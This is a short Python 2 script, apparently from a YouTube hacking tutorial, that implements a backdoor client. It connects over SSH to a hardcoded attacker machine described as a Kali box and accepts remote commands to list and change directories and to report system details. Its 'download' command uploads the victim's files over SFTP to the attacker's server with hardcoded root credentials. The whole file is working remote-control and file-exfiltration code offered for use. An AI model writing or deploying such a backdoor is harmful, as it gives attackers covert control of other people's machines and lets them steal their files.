import paramiko
import os
import threading


def sftp(path):#sftp command passing path 
    try:
        transport = paramiko.transport.Transport(('192.168.1.22', 222))#port 222 and ip of the server or kali machine
        transport.connect(username='root', password ='toor')#ID password
        sftp_client = paramiko.SFTPClient.from_transport(transport)
        sftp_client.put(path, '/root/Desktop/SFTP/'+path)#path where the files willl be saved
        sftp_client.close()
        transport.close()
    except:
        pass


def connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())#autoadd policy for authentication 
    client.connect('192.168.1.22',username='Priyank', password='123')#change IP and user password
    chan = client.get_transport().open_session()
    chan.send("Hey i'm connected here :) ")
    print chan.recv(1024)


    while True:#if connection is complete 
        
        command =  chan.recv(1024)
        if 'terminate' in command:  #if terminate is present in command                 
            chan.close()#close connection 
            break #break loop


        elif 'pwd' in command:                  
            chan.send( "[+] CWD Is " + os.getcwd() )#if pwd is present then show present directory 

        elif 'ls' in command:#if ls is present then list directory 
            dirs = os.listdir( os.getcwd() )
            chan.send(str(dirs))
  
        
        elif 'cd' in command:
            try:#if cd is present then try this
                code,directory = command.split ('*')#split words cd*location 
                os.chdir(directory)#change directory to the location
                chan.send( "[+] CWD Is " + os.getcwd() )#show current directory
            except:
                chan.send( "[-] Error, Double check the Dir" )#error

        elif 'uname' in command:#if uname is present then this
            chan.send ( str(os.uname()) )#show details of os

        elif 'download' in command:#if download is in command
            blah,path = command.split('*')#split words download*file
            threading.Thread(target=sftp, args=(path,)).start()#pass to function sftp
            chan.send( '[+]Starting SFTP Function' )#prints that sftp is started
        else:
            chan.send ( '[-] Unrecognized command!' )#error
            

connect()
#subscribe www.youtube.com/priyankgada






